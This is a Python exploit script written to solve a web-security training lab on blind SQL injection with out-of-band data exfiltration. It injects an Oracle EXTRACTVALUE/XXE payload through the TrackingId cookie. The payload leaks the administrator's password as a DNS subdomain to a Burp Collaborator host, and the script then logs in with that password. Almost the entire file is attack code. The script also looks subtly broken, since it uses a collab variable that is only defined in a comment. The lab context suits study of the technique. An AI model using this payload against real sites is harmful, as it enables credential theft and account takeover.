# Blind SQL injection with out-of-band data exfiltration

# https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup
import argparse


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(s, url):
	r = s.get(url)
	time.sleep(1)
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t%s' % csrf)
	return csrf

def send_payload(s, url, tracking_cookie, session_cookie, payload):
	cookies = {"TrackingId": tracking_cookie + payload, "session": session_cookie}
	r = s.get(url, cookies=cookies)
	time.sleep(.3)
	print('[+] Using payload:\t%s' % payload)
	return r

def dnslookup(s, url, tracking_cookie, session_cookie, collab):
	payload = """' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.""" + collab + """/"> %remote;]>'),'/l') FROM dual)--;"""
	r = send_payload(s, url, tracking_cookie, session_cookie, urllib.parse.quote(payload))
	print(r)
	return r

def admin_login(s, url, password):
	print('\n[+] Trying to login as Administrator with found credentials...\n')
	login_path = url + '/login'
	s = requests.Session()
	csrf_token = get_csrf_token(s, login_path)
	username = "administrator"
	login_data = {"username": username, "password": password, "csrf": csrf_token}
	r = s.post(login_path, data=login_data)
	time.sleep(1)
	res = r.text
	if 'Your username is: administrator' in res:
		return r.text
	else:
		return False


##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: Blind SQL injection with out-of-band data exfiltration')
	parser = argparse.ArgumentParser(description="[+] Lab: Blind SQL injection with out-of-band data exfiltration")
	parser.add_argument('-U',dest='url',required=True, help="Target URL")
	parser.add_argument('-C',dest='collab',required=True, help="Collaborator URL")
	args = parser.parse_args()
	parsed_url = urllib.parse.urlparse(args.url)
	host = parsed_url.netloc
	print(parsed_url)
	url = parsed_url.scheme + '://' + host
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			# collab = "xxxxxxxxxxxxxxxxxxxx.oastify.com"
			tracking_cookie = s.cookies.get_dict().get('TrackingId')
			session_cookie = s.cookies.get_dict().get('session')
			response = dnslookup(s, url, tracking_cookie, session_cookie, collab)
			if response.status_code == 200:
				print('[+] Check your Burp Collaborator !')
				print('[+] A DNS request should have been received with admin password as subdomain !')
				admin_password = input('Admin password:\n> ')
				print('[+] Trying to connect on /login as "administrator" and his found password...')
				if admin_login(s, url, admin_password):
					print('[+] Successfully logged in as Administrator user !')
					time.sleep(5)
					s.cookies.clear()
					s.headers.clear()
					r = s.get(url)
					if 'Congratulations, you solved the lab!' in r.text:
						print('[+] The lab is solved !')
				else:
					print('[-] The Exploit failed to connect as administrator <!>')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')
	except KeyboardInterrupt:
		sys.exit(0)

if __name__ == "__main__":
	main()
